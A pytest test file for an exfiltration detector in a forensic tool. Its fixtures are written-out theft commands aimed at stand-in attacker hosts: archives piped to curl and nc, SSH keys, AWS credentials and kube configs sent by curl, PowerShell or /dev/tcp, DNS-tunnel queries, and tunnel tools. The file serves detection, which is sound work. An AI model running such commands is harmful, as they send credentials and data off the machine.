"""ExfiltrationDetector — 11th Decepticon countermeasure.

Covers the 6 detection layers: archive-then-pipe, cloud-bucket cp,
web-service exfil (paste / webhook / gist), protocol tunnels,
sensitive-target read-and-POST, DNS-tunnel label shape."""

from __future__ import annotations

import pytest

from digger.core.evidence import Artifact, EvidenceStore
from digger.detectors.exfiltration import ExfiltrationDetector
from digger.genrule.sigma import finding_to_sigma


def _store(tmp_path):
    return EvidenceStore(tmp_path / "evidence.db")


def _proc(store, pid, name, cmdline, exe=None, username="user"):
    cm = cmdline if isinstance(cmdline, list) else [cmdline] if cmdline else []
    store.add_artifact(Artifact(
        collector="processes", category="process",
        subject=f"pid={pid} {name}",
        data={"pid": pid, "ppid": 1, "name": name,
              "exe": exe or f"/usr/bin/{name}",
              "cmdline": cm, "username": username,
              "connections": [], "open_files": []},
    ))


# ---- X1 archive | net-client pipe ---- #


def test_tar_curl_archive_pipe_flagged(tmp_path):
    store = _store(tmp_path)
    _proc(store, 1, "bash",
          ["bash", "-c", "tar czf - /home/user | curl -T - https://x.com/u"])
    findings = list(ExfiltrationDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "archive_pipe"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "high"
    assert hits[0].mitre == "T1041"
    store.close()


def test_zip_nc_archive_pipe_flagged(tmp_path):
    store = _store(tmp_path)
    _proc(store, 2, "bash",
          ["bash", "-c", "zip -r - /var/log | nc attacker.com 4444"])
    findings = list(ExfiltrationDetector().detect(store))
    assert any(f.evidence.get("kind") == "archive_pipe" for f in findings)
    store.close()


def test_no_archive_pipe_clean(tmp_path):
    store = _store(tmp_path)
    _proc(store, 3, "tar", ["tar", "czf", "/tmp/backup.tar.gz", "/etc"])
    findings = list(ExfiltrationDetector().detect(store))
    assert not [f for f in findings if f.evidence.get("kind") == "archive_pipe"]
    store.close()


# ---- X2 cloud-bucket exfil ---- #


def test_aws_s3_cp_medium(tmp_path):
    store = _store(tmp_path)
    _proc(store, 10, "aws",
          ["aws", "s3", "cp", "/tmp/data.tar", "s3://attacker-bucket/data.tar"])
    findings = list(ExfiltrationDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "cloud_bucket_exfil"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "medium"
    assert hits[0].mitre == "T1567.002"
    assert "aws s3" in (hits[0].evidence.get("pattern") or "").lower()
    store.close()


def test_aws_s3_cp_sensitive_high(tmp_path):
    """Same cloud cp but the source is ~/.aws/credentials — bumps to high."""
    store = _store(tmp_path)
    _proc(store, 11, "aws",
          ["aws", "s3", "cp", "/root/.aws/credentials",
           "s3://attacker-bucket/creds"])
    findings = list(ExfiltrationDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "cloud_bucket_exfil"]
    assert hits
    assert hits[0].severity == "high"
    assert hits[0].evidence.get("sensitive_source") is True
    store.close()


def test_gsutil_rsync_flagged(tmp_path):
    store = _store(tmp_path)
    _proc(store, 12, "gsutil",
          ["gsutil", "rsync", "-r", "/var/lib", "gs://attacker/lib"])
    findings = list(ExfiltrationDetector().detect(store))
    assert any("gsutil" in (f.evidence.get("pattern") or "")
               for f in findings if f.evidence.get("kind") == "cloud_bucket_exfil")
    store.close()


def test_rclone_sync_flagged(tmp_path):
    store = _store(tmp_path)
    _proc(store, 13, "rclone",
          ["rclone", "sync", "/srv/db-backups", "remote:attacker/dbs"])
    findings = list(ExfiltrationDetector().detect(store))
    assert any("rclone" in (f.evidence.get("pattern") or "")
               for f in findings if f.evidence.get("kind") == "cloud_bucket_exfil")
    store.close()


def test_azcopy_flagged(tmp_path):
    store = _store(tmp_path)
    _proc(store, 14, "azcopy",
          ["azcopy", "copy", "/srv/data",
           "https://attacker.blob.core.windows.net/x"])
    findings = list(ExfiltrationDetector().detect(store))
    assert any("azcopy" in (f.evidence.get("pattern") or "")
               for f in findings if f.evidence.get("kind") == "cloud_bucket_exfil")
    store.close()


# ---- X3 web-service exfil (paste / webhook / gist) ---- #


@pytest.mark.parametrize("domain,kind", [
    ("pastebin.com", "paste-bin"),
    ("transfer.sh", "anonymous file-drop"),
    ("file.io", "anonymous file-drop"),
    ("0x0.st", "anonymous file-drop"),
    ("hooks.slack.com", "Slack webhook"),
    ("discord.com/api/webhooks", "Discord webhook"),
    ("api.telegram.org/bot", "Telegram bot"),
    ("webhook.site", "webhook capture"),
    ("api.github.com/gists", "GitHub gist API"),
])
def test_web_exfil_destinations_flagged(tmp_path, domain, kind):
    store = _store(tmp_path)
    _proc(store, 20, "curl",
          ["curl", "-F", "file=@/tmp/data.txt",
           f"https://{domain}/foo"])
    findings = list(ExfiltrationDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "web_service_exfil"]
    assert hits, [f.title for f in findings]
    assert hits[0].evidence.get("destination_kind") == kind
    assert hits[0].severity == "high"
    store.close()


def test_github_gist_routes_to_t1567_001(tmp_path):
    store = _store(tmp_path)
    _proc(store, 21, "curl",
          ["curl", "-X", "POST", "-H", "Authorization: token X",
           "https://api.github.com/gists", "-d", "@payload.json"])
    findings = list(ExfiltrationDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "web_service_exfil"]
    assert hits
    assert hits[0].mitre == "T1567.001"
    store.close()


# ---- X4 protocol-tunneling tools ---- #


@pytest.mark.parametrize("cmd,expected_mitre", [
    (["dnscat2", "attacker.com"], "T1572"),
    (["iodine", "-f", "tunnel.example.com"], "T1572"),
    (["chisel", "client", "1.2.3.4:8080", "R:9000:127.0.0.1:80"], "T1572"),
    (["ngrok", "tcp", "22"], "T1572"),
    (["frpc", "-c", "/etc/frp/frpc.ini"], "T1572"),
    (["cloudflared", "tunnel", "--url", "localhost:80"], "T1572"),
    (["dnsteal", "exfil.example.com", "/tmp/data"], "T1041"),
])
def test_tunnel_tools_flagged(tmp_path, cmd, expected_mitre):
    store = _store(tmp_path)
    _proc(store, 30, cmd[0], cmd, exe=f"/opt/{cmd[0]}/{cmd[0]}")
    findings = list(ExfiltrationDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "protocol_tunnel"]
    assert hits, [f.title for f in findings]
    assert hits[0].mitre == expected_mitre
    store.close()


def test_ngrok_in_user_local_bin_softens_to_medium(tmp_path):
    """Devs run ngrok legitimately from their own bin."""
    store = _store(tmp_path)
    _proc(store, 31, "ngrok", ["ngrok", "http", "3000"],
          exe="/Users/dev/.local/bin/ngrok")
    findings = list(ExfiltrationDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "protocol_tunnel"]
    assert hits
    assert hits[0].severity == "medium"
    assert hits[0].evidence.get("self_clone_hint") is True
    store.close()


def test_ssh_port_forward_flagged(tmp_path):
    store = _store(tmp_path)
    _proc(store, 32, "ssh",
          ["ssh", "-R", "9000:127.0.0.1:22", "user@bastion.example.com"])
    findings = list(ExfiltrationDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "protocol_tunnel"]
    assert hits
    assert "ssh" in (hits[0].evidence.get("pattern") or "").lower()
    store.close()


# ---- X5 sensitive-target read-and-POST ---- #


def test_ssh_key_curl_post_critical(tmp_path):
    store = _store(tmp_path)
    _proc(store, 40, "bash",
          ["bash", "-c", "curl -F 'file=@/root/.ssh/id_rsa' https://attacker.com/u"])
    findings = list(ExfiltrationDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "sensitive_post"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "critical"
    assert hits[0].mitre == "T1041"
    store.close()


def test_aws_creds_invoke_webrequest_critical(tmp_path):
    store = _store(tmp_path)
    _proc(store, 41, "powershell.exe",
          ["powershell.exe", "-c",
           "Invoke-WebRequest -Method POST -InFile ~/.aws/credentials "
           "-Uri https://attacker/exfil"])
    findings = list(ExfiltrationDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "sensitive_post"]
    assert hits
    assert hits[0].severity == "critical"
    store.close()


def test_bash_devtcp_to_kubeconfig_critical(tmp_path):
    store = _store(tmp_path)
    _proc(store, 42, "bash",
          ["bash", "-c",
           "cat /root/.kube/config; bash -c 'cat /root/.kube/config > /dev/tcp/1.2.3.4/9000'"])
    findings = list(ExfiltrationDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "sensitive_post"]
    assert hits
    assert hits[0].severity == "critical"
    store.close()


def test_reading_sensitive_without_network_not_flagged(tmp_path):
    """`cat /etc/shadow` alone is privesc-territory, not exfil."""
    store = _store(tmp_path)
    _proc(store, 43, "cat", ["cat", "/etc/shadow"])
    findings = list(ExfiltrationDetector().detect(store))
    assert not [f for f in findings if f.evidence.get("kind") == "sensitive_post"]
    store.close()


# ---- X6 DNS-tunnel anomalous label shape ---- #


def test_dns_tunnel_long_label_flagged(tmp_path):
    """Multiple 40+ char base32 labels chained in one cmdline arg."""
    store = _store(tmp_path)
    payload = (
        "MFRGGZDFMZTWQ2LKNF2GS43JOZRGS5LJONSWS4TMNRRG6ZDPNVUW43LSPF4"
        ".OZSXE6LSMQQGSZLOMRSXG6LQNRRGY3DJORQXAYL3MQQGGZDFMZSGS3LKN4"
        ".QSDA.tunnel.attacker.io"
    )
    _proc(store, 50, "dig", ["dig", payload])
    findings = list(ExfiltrationDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "dns_tunnel_shape"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "high"
    assert hits[0].mitre == "T1048.003"
    store.close()


def test_normal_fqdn_not_flagged(tmp_path):
    store = _store(tmp_path)
    _proc(store, 51, "curl",
          ["curl", "https://api.something.example.com/v1/data"])
    findings = list(ExfiltrationDetector().detect(store))
    assert not [f for f in findings if f.evidence.get("kind") == "dns_tunnel_shape"]
    store.close()


# ---- Sigma ---- #


def test_sigma_for_archive_pipe(tmp_path):
    store = _store(tmp_path)
    _proc(store, 60, "bash",
          ["bash", "-c", "tar cz - /home | curl -T - https://x.com"])
    f = next(iter(ExfiltrationDetector().detect(store)))
    rule = finding_to_sigma({
        "detector": f.detector, "title": f.title, "summary": f.summary,
        "severity": f.severity, "evidence": f.evidence,
        "finding_uuid": "x-1", "mitre": f.mitre,
    }, case_id="t")
    assert rule is not None
    assert rule["logsource"]["category"] == "process_creation"
    assert "attack.exfiltration" in rule["tags"]
    store.close()


def test_sigma_template_present():
    tpl = ExfiltrationDetector().to_sigma_template()
    assert tpl is not None
    assert "attack.t1041" in tpl["tags"]
    assert "attack.t1567" in tpl["tags"]
    assert "attack.t1572" in tpl["tags"]
    # Four selection blocks: archive-pipe, cloud-bucket, web-service, tunnel
    sels = [k for k in tpl["detection"] if k.startswith("selection_")]
    assert len(sels) >= 4


# ---- Registry hookup ---- #


def test_detector_registered():
    from digger.detectors import all_detectors
    assert "exfiltration" in [d.name for d in all_detectors()]
